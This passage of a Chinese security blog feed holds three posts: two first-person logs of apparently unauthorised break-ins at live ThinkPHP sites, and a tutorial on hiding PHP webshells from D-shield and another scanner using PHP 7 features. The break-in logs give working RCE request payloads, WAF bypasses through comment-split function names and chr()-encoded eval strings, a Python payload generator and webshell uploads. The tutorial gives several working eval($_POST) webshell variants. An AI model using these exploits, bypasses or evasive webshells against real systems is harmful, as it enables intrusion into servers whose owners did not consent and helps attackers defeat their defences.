    <content type="html"><![CDATA[<h1 id="前"><a href="#前" class="headerlink" title="前"></a>前</h1><p>拿到目标站后，看了看url，为 <code>signup.html</code>，加了个 <code>?s=captcha</code>,显示验证码，判断为tp框架。</p><p>果断拿起exp测试</p><p><img src="/images/image-20200522191303596.png" alt="image-20200522191303596"></p><p>很好，能成功，暗自窃喜一波。</p><p>之后看看phpinfo；</p><p><img src="/images/image-20200522191416443.png" alt="image-20200522191416443"></p><p>被拦截了</p><p>之后测试了一下404页面。</p><p><img src="/images/image-20200522191504255.png" alt="image-20200522191504255"></p><p>熟悉的拦路狗。</p><h1 id="中"><a href="#中" class="headerlink" title="中"></a>中</h1><p>猜测拦截了exp，但是很明显没有拦截包含日志的exp。</p><ul><li><p>试试包含日志。</p><p>将cookie设为 <code>&lt;?php phpinfo();?&gt;</code></p><p>结果被拦截，猜测拦截函数。</p></li><li><p>将cookie设为 <code>&lt;?php phpinfo/**/();?&gt;</code>,绕过了。php7.2版本。</p><p><img src="/images/image-20200522193950383.png" alt="image-20200522193950383"></p></li><li><p>之后测试一下写入</p><p><code>Cookie:file_put_contents/**/(&#39;./readme.txt&#39;,&#39;h3art3ars&#39;);</code></p><p><img src="/images/image-20200522195121019.png" alt="image-20200522195121019"></p><p>过滤了单引号，就知道没那么容易。</p></li><li><p>试一下不带payload的一句话 <code>&lt;? eval/**/(base64_decode($_POST[1]));?&gt;</code></p><p><code>post:_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/22.log&amp;1=cGhwaW5mbygpOw==</code></p><p>结果依旧被拦截。</p></li><li><p>测试了一下，是拦截了 $_POST[] 参数，那就继续绕过。将 <code>_POST</code> 参数，利用引用参数代替。</p><p>在本地 php shell 里面测试</p><p><img src="/images/image-20200522201052725.png" alt="image-20200522201052725"></p><p>可以看到在本地linux是测试成功的。</p></li><li><p>直接放到cookie里面看看：<code>Cookie:&lt;? $a=chr/**/(95).chr/**/(80).chr/**/(79).chr/**/(83).chr/**/(84);eval/**/(base64_decode/**/($/**/{$a}[1]));?&gt;</code></p><p><img src="/images/image-20200522201322865.png" alt="image-20200522201322865"></p><p>对方系统windows，出错了。不知道是为什么。</p></li><li><p>那就只能换一个思路，直接将要执行的命令用chr函数表示。</p><p>由于一个一个chr太麻烦，索性写了个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import base64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &#39;phpinfo()&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; base64.b64encode(cmd.encode(&#39;utf-8&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; bytes.decode(strs)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for c in strs:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    a +&#x3D; &quot;chr&#x2F;**&#x2F;(&quot; + str(ord(c))+&#39;).&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">a &#x3D; a[0:-1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&lt;? $a&#x3D;&#39;+a + &#39;;eval&#x2F;**&#x2F;(base64_decode&#x2F;**&#x2F;($a));?&gt;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">print(a)</span></pre></td></tr></table></figure><p><img src="/images/image-20200522203613777.png" alt="image-20200522203613777"></p></li><li><p>把payload复制到cookie中试试,成功。</p><p><img src="/images/image-20200522203503512.png" alt="image-20200522203503512"></p></li><li><p>接下来写入一句话，然而却是访问404.</p></li><li><p>猜测是狗吃了一句话，那就从上次写的 <code>php新特性过马</code>文章中拿一个试试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$b&#x3D;&quot;_POST&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[$&#123;$b&#125;[&#39;a&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[$c]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($c);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/image-20200522210021466.png" alt="image-20200522210021466"></p><p>执行，测试一下。</p><p><img src="/images/image-20200522210102083.png" alt="image-20200522210102083"></p><p>成功。</p></li></ul><h1 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h1><p>windows提权，未成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Windows NT WIN-RU4FAFHHEMH 6.1 build 7601 (Windows Server 2008 R2 Enterprise Edition Service Pack 1) AMD64</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      渗透测试记录
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试纪实-1</title>
    <link href="http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/"/>
    <id>http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/</id>
    <published>2020-05-21T07:59:36.000Z</published>
    <updated>2020-05-21T08:03:58.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>找到目标站，大略浏览了一遍</p><p>看了一下url <code>app/dist/index.html#/reg?phone=</code>有点像thinkphp框架，</p><p>试了试 <code>domain/captcha</code>显示404</p><p>之后看了看chrome network抓的包</p><p><img src="/images/image-20200521145023239.png" alt="image-20200521145023239"></p><p>看样子是改了默认的入口文件 <code>index.php</code></p><p>之后又试了下 <code>tl_api.php?s=captcha</code></p><p><img src="/images/image-20200521145919691.png" alt="image-20200521145919691"></p><p>熟悉的界面。</p><p>直接上exp，然后，所有的报错页面都显示这个。</p><p><img src="/images/image-20200521150108485.png" alt="image-20200521150108485"></p><p>心里顿时暗道不妙，还记得上次也是tp的站 ，对方加了cloudflare，然后动不动禁ip，一上exp就禁ip，弄得我束手无测，不过这次报错界面却暴露了他的真实ip。SERVER_ADDR对应的值就是真实ip。</p><p>之后直接从真实ip入手</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>试了试日志和session包含，</p><p><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/19.log</code></p><p>但是都失败了</p><p>说不定版本小于7.1.索性直接assert</p><p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=phpinfo();</code></p><p>成功了，是php5.6版本的。</p><p>之后就是写入shell了。</p><p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=file_put_contents(&#39;./readme.php&#39;,base64_decode(&#39;PD9waHAgCiAgICAkYiA9IHN1YnN0cigkX1BPU1RbJ2gzYXJ0M2FycyddLCAxKTsKICAgIGV2YWwoYmFzZTY0X2RlY29kZSgkYikpOwo/Pg==&#39;));</code></p><p>然后报了出乎意料的错误，语法错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected &#39;&#39;.&#x2F;readme.php\&#39;,base64_decode&#39; (T_ENCAPSED_AND_WHITESPACE), expecting identifier (T_STRING) in assert code on line 1</span></pre></td></tr></table></figure><p>是过滤了单引号了。</p><h2 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h2><p>assert调用assert</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;assert&amp;get[]&#x3D;assert(base64_decode($_POST[1]));&amp;1&#x3D;ZmlsZV9wdXRfY29udGVudHMoJy4vcmVhZG1lLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdDaUFnSUNBa1lpQTlJSE4xWW5OMGNpZ2tYMUJQVTFSYkoyZ3pZWEowTTJGeWN5ZGRMQ0F4S1RzS0lDQWdJR1YyWVd3b1ltRnpaVFkwWDJSbFkyOWtaU2drWWlrcE93by9QZz09Jykp</span></pre></td></tr></table></figure><p>最终写入了shell。</p><p><img src="/images/image-20200521152159765.png" alt="image-20200521152159765"></p><p>提权未成功，bypass disable未成功</p><p><code>Linux guest 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64</code></p>]]></content>
    
    <summary type="html">
    
      实际渗透测试记录
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>利用php新特性过静态查杀</title>
    <link href="http://h3art3ars.github.io/2020/02/27/%E5%88%A9%E7%94%A8php%E6%96%B0%E7%89%B9%E6%80%A7%E8%BF%87%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80/"/>
    <id>http://h3art3ars.github.io/2020/02/27/%E5%88%A9%E7%94%A8php%E6%96%B0%E7%89%B9%E6%80%A7%E8%BF%87%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80/</id>
    <published>2020-02-27T06:15:21.000Z</published>
    <updated>2020-02-27T06:19:03.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在研究webshell免杀，抽出心得的一个新颖的点。原因是突然想到既然php7.1不能利用可变函数的assert，那就利用php7的新特性来绕过查杀正则，最终绕过某盾和“某d0g”。</p><p>实验环境在7.1.9，所有马儿在php7以下的环境均不能使用。</p><p>D盾规则库（最新）：20191227</p><p>某d0g因为可能会因为用其产品测试，导致侵权行为，为了防止被举报所以就不放图了。</p><h1 id="前置实验"><a href="#前置实验" class="headerlink" title="前置实验"></a>前置实验</h1><h2 id="某盾"><a href="#某盾" class="headerlink" title="某盾"></a>某盾</h2><p>首先以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;aaaa&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">eval($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-1.png" alt=""></p><p>直接误报了。</p><p>因此，直接传参到eval里面是不现实的。</p><p>所以接下来我们要利用函数，配合php新特性来绕过它。</p><h2 id="某d0g"><a href="#某d0g" class="headerlink" title="某d0g"></a>某d0g</h2><p>而对于某d0g，只要以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$_POST[&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">eval($b)</span></pre></td></tr></table></figure><p>就会让其误报。</p><p>因此在写免杀马的时候，post中的变量，不要出现在eval中的字符串中。就像上面<code>b</code>一样，尽管他在<code>eval</code>中是以变量的形式出现的。</p><p>有了这个基础就可以进入正题了</p><h1 id="PHP7-0-x"><a href="#PHP7-0-x" class="headerlink" title="PHP7.0.x"></a>PHP7.0.x</h1><p><a href="https://www.php.net/manual/zh/migration70.new-features.php" target="_blank" rel="noopener">php手册-php7.0.x新特性</a></p><h2 id="返回值类型声明"><a href="#返回值类型声明" class="headerlink" title="返回值类型声明"></a>返回值类型声明</h2><p>php7增加了返回值类型声明的支持，在定义函数时增加一个 <code>：类型</code>便可以了。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">function a():int&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>就是函数返回值类型要为int。否则会强制转换或者显示语法错误。</p><p>如果未更新此特性的查杀软件，就会不认识此函数，导致被绕过。</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function b():string&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">return $_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval(b());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>可以用查杀软件测试一下。</p><p><img src="/images/webshell-2.png" alt="webshell-0221114935875"></p><p>发现没有被检测到。</p><p><img src="/images/webshell-3.png" alt=""></p><p>可以使用。</p><h2 id="null合并运算符"><a href="#null合并运算符" class="headerlink" title="null合并运算符"></a>null合并运算符</h2><p> 由于日常使用中存在大量同时使用三元表达式和 <code>isset()</code>的情况， 添加了null合并运算符 (<em>??</em>) 这个语法糖。如果变量存在且值不为<strong><code>NULL</code></strong>， 它就会返回自身的值，否则返回它的第二个操作数 </p><p>简单来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;isset($_POST[&#39;a&#39;])?$_POST[&#39;a&#39;]:&#39;h3art3ars&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&lt;&#x3D;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$_POST[&#39;a&#39;]??&#39;h3art3ars&#39;;</span></pre></td></tr></table></figure><p>如果运用 <code>？？</code>符号，查杀软件不会理解着个处理过程 ，可能就会导致绕过。</p><p>就像以下代码就可以绕过某d0g</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$b??$_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">eval($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>再利用函数调用一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$b??$_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">return $a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-4.png" alt="webshell-0221135305463"></p><p>可以发现已经过了D盾</p><p>测试一下可用性</p><p><img src="/images/webshell-5.png" alt="webshell-0221135427992"></p><p>接下来看看7.1的特性吧</p><h1 id="php7-1-x"><a href="#php7-1-x" class="headerlink" title="php7.1.x"></a>php7.1.x</h1><p><a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">php手册-php7.0.x新特性</a></p><h2 id="可为空（Nullable）类型"><a href="#可为空（Nullable）类型" class="headerlink" title="可为空（Nullable）类型"></a>可为空（Nullable）类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">参数以及返回值的类型现在可以通过在类型前加上一个问号使之允许为空。 当启用这个特性时，传入的参数或者函数返回的结果要么是给定的类型，要么是 null 。</span></pre></td></tr></table></figure><p>比7.1的特性多了个 <code>？</code>函数返回值若不是给定类型，则为空。</p><p>使用同样的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a(): ?string</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    return $_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> ?&gt;</span></pre></td></tr></table></figure><p>不出意外</p><p><img src="/images/webshell-6.png" alt="webshell-0219204958964"></p><p>过了D盾</p><h2 id="短数组语法"><a href="#短数组语法" class="headerlink" title="短数组语法"></a>短数组语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">短数组语法（[]）现在作为list()语法的一个备选项，可以用于将数组的值赋给一些变量（包括在foreach中）。</span></pre></td></tr></table></figure><p>这里选用中括号 <code>[]类型</code>的列表来演示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;a&#39;,&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr></table></figure><p>这样，就把数组的值分别赋给了<code>$c</code>,<code>$d</code>.<code>$c=&#39;a&#39;;$d=&#39;b&#39;;</code></p><p>这样，就可以用这个少用的特性，来绕过静态查杀</p><p>首先写一个最简单的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;h3art3ars&#39;,$_POST[&#39;h3art3ars&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">eval($d);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>然后就过了某d0g。自行测试。</p><p>之后就可以配合函数。就像这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;h3art3ars&#39;,$_POST[&#39;h3art3ars&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">return $d;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>查杀一下</p><p><img src="/images/webshell-7.png" alt="webshell-0221142921253"></p><p>测试可用性</p><p><img src="/images/webshell-8.png" alt="webshell-0221143047426"></p><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list()现在支持键名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">官方说明：现在list()和它的新的[]语法支持在它内部去指定键名。这意味着它可以将任意类型的数组 都赋值给一些变量（与短数组语法类似）</span></pre></td></tr></table></figure><p>这个很绕，看一下例子也许就会明白了。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"> $data &#x3D; [&quot;id&quot; &#x3D;&gt; 1, &quot;name&quot; &#x3D;&gt; &#39;h3art3ars&#39;]; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[&quot;id&quot; &#x3D;&gt; $a, &quot;name&quot; &#x3D;&gt; $b] &#x3D; $data;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;结果$a&#x3D;1,$b&#x3D;&#39;h3art3ars&#39;</span></pre></td></tr></table></figure><p>稍微改改就能过某d0g(自行测试)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&quot;shell&quot;&#x3D;&gt;&#39;a&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&quot;c&quot;&#x3D;&gt;$_POST[&#39;h3art3ars&#39;],</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">[&quot;shell&quot;&#x3D;&gt;$c,&quot;c&quot;&#x3D;&gt;$b]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">eval($b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>试试D盾</p><p><img src="/images/webshell-9.png" alt="webshell-0219205502645"></p><p>报了一级</p><p>再次借助自定义函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&quot;shell&quot;&#x3D;&gt;&#39;a&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&quot;c&quot;&#x3D;&gt;$_POST[&#39;h3art3ars&#39;],</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">[&quot;shell&quot;&#x3D;&gt;$c,&quot;c&quot;&#x3D;&gt;$b]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  return  $b;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-10.png" alt="webshell-0219193523997"></p><p>成功过D，测试可用性。</p><p><img src="/images/webshell-11.png" alt="webshell-0219193554027"></p><h2 id="支持为负的字符串偏移量"><a href="#支持为负的字符串偏移量" class="headerlink" title="支持为负的字符串偏移量"></a>支持为负的字符串偏移量</h2><p>官方说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">现在所有支持偏移量的字符串操作函数 都支持接受负数作为偏移量，包括通过[]或&#123;&#125;操作字符串下标。在这种情况下，一个负数的偏移量会被理解为一个从字符串结尾开始的偏移量。</span></pre></td></tr></table></figure><p>这个在小于7.1版本中，负的偏移量返回空字串。</p><p>eg：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&quot;h3art3ars&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">var_dump($a[-1]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>7.1.x中返回 <code>s</code>，但是以前的版本中 返回 <code>string(0) &quot;&quot;</code></p><p>思路：</p><p>我们可以这个拆分字符串，使规则识别不出来。最后再配合php的可变变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&quot;TSOP_&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$b&#x3D;$a[-1].$a[-2].$a[-3].$a[-4].$a[-5];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$c&#x3D;$&#123;&quot;$b&quot;&#125;[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($c);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>这样就可以过某d0g了。但是对于D盾来说，会识别拼接字符，和可变变量。报一级<code>可疑文件</code>，不得不说这点做的确实很好。</p><h1 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h1><p>其实还有很多特性，就像<code>通过define()定义常量数组</code>，也都可以举一反三去绕过。而且不止自定义函数，还可以配合类，可变变量等，来绕过静态查杀。</p><p>还可以利用 <code>太空船操作符（组合比较符）</code>，<code>整数除法函数 intdiv()</code>等来绕过动态查杀。</p><p>这里给D哥的规则库又能添加几条了。哈哈。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p> <a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration71.new-features.php</a> </p><p> <a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations</a> </p>]]></content>
    
    <summary type="html">
    
      webshell绕过静态查杀的特殊方法
    
    </summary>
    
    
